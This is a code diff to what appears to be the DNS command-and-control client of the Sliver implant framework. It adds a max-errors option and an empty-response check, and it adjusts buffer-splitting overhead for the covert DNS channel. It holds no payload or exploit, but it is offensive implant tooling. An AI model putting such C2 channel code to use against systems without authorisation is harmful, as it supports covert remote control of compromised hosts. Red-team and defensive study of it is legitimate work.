@@ -91,6 +91,7 @@ var (
 	ErrClosed              = errors.New("dns session closed")
 	ErrInvalidResponse     = errors.New("invalid response")
 	ErrInvalidIndex        = errors.New("invalid start/stop index")
+	ErrEmptyResponse       = errors.New("empty response")
 )
 
 // DNSOptions - c2 specific options
@@ -98,6 +99,7 @@ type DNSOptions struct {
 	QueryTimeout      time.Duration
 	RetryWait         time.Duration
 	RetryCount        int
+	MaxErrors         int
 	WokersPerResolver int
 	ForceBase32       bool
 	ForceResolvConf   string
@@ -125,11 +127,17 @@ func ParseDNSOptions(c2URI *url.URL) *DNSOptions {
 	if err != nil || workersPerResolver < 1 {
 		workersPerResolver = 2
 	}
+	// Max errors
+	maxErrors, err := strconv.Atoi(c2URI.Query().Get("max-errors"))
+	if err != nil || maxErrors < 0 {
+		maxErrors = 10
+	}
 
 	return &DNSOptions{
 		QueryTimeout:      queryTimeout,
 		RetryWait:         retryWait,
 		RetryCount:        retryCount,
+		MaxErrors:         maxErrors,
 		WokersPerResolver: workersPerResolver,
 		ForceBase32:       strings.ToLower(c2URI.Query().Get("force-base32")) == "true",
 		ForceResolvConf:   c2URI.Query().Get("force-resolv-conf"),
@@ -436,6 +444,12 @@ func (s *SliverDNSClient) ReadEnvelope() (*pb.Envelope, error) {
 	if err != nil {
 		return nil, err
 	}
+	// {{if .Config.Debug}}
+	log.Printf("[dns] read msg resp data: %v", respData)
+	// {{end}}
+	if len(respData) < 1 {
+		return nil, nil
+	}
 
 	dnsMsg := &dnspb.DNSMessage{}
 	err = proto.Unmarshal(respData, dnsMsg)
@@ -620,7 +634,7 @@ func (s *SliverDNSClient) SplitBuffer(msg *dnspb.DNSMessage, encoder encoders.En
 		if lastLen == 0 {
 			stop += int(float64(s.subdataSpace) / 2) // base32 overhead is about 160%
 		} else {
-			stop += (lastLen - 4) // max start uint32 overhead
+			stop += (lastLen - 6) // max start uint32 overhead
 		}
 		if len(data) < stop {
 			stop = len(data) - 1 // make sure the loop is executed at least once
